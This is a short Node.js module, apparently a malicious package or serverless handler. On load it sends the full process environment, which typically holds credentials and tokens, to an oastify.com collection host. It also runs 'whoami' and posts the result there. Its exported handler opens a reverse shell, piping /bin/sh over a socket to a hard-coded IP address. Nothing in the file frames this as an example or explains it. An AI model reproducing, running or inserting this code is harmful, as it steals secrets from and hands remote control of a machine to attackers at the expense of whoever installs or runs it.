const axios = require('axios');

axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/exfil', process.env);
  
  var exec = require('child_process').exec;
  var cmd = 'whoami';
  var result = exec(cmd, function(error, stdout, stderr) {  });
  axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere2', result)
  module.exports = (context, req, res) => {
  (function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(80, "3.133.114.82", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
  })();
};

